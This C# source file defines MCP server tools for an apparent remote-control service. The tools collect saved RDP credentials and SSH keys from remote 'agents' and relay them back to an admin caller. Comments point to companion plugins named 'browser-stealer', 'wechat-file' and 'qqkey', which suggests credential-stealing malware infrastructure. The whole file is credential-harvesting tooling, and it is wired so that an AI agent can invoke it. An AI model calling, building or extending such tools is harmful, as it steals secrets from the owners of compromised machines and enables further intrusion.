using System.ComponentModel;
using ModelContextProtocol.Server;
using LibraNextgen.Service.Services;
using Microsoft.AspNetCore.Http;

namespace LibraNextgen.Service.Mcp;

/// <summary>Credential-focused tools: RDP, SSH keys.
/// QQ functionality lives in the qqkey plugin; WeChat/browser data now live in
/// their own plugins (com.libra.wechat-file / com.libra.browser-stealer).
/// All credential tools require an Admin access key.</summary>
[McpServerToolType]
public sealed class CredTools
{
    [McpServerTool, Description("Collect saved RDP credentials (Credential Manager + .rdp files) from an agent (requires Admin)")]
    public static async Task<string> get_rdp_credentials(
        IHttpContextAccessor http,
        RelayService relay,
        AgentService agents,
        [Description("Target agent ID")] string agentId,
        CancellationToken ct = default)
    {
        var caller = McpUtils.GetCaller(http);
        var adminError = McpUtils.RequireAdmin(caller, "get_rdp_credentials");
        if (adminError.Length > 0) return adminError;

        return await McpUtils.RelayOrError(relay, agents, caller, agentId, "creds",
            new { op = "rdp" }, ct, TimeSpan.FromSeconds(45));
    }

    [McpServerTool, Description("Collect SSH keys from an agent (~/.ssh) (requires Admin)")]
    public static async Task<string> get_ssh_keys(
        IHttpContextAccessor http,
        RelayService relay,
        AgentService agents,
        [Description("Target agent ID")] string agentId,
        CancellationToken ct = default)
    {
        var caller = McpUtils.GetCaller(http);
        var adminError = McpUtils.RequireAdmin(caller, "get_ssh_keys");
        if (adminError.Length > 0) return adminError;

        return await McpUtils.RelayOrError(relay, agents, caller, agentId, "creds",
            new { op = "ssh" }, ct, TimeSpan.FromSeconds(30));
    }
}
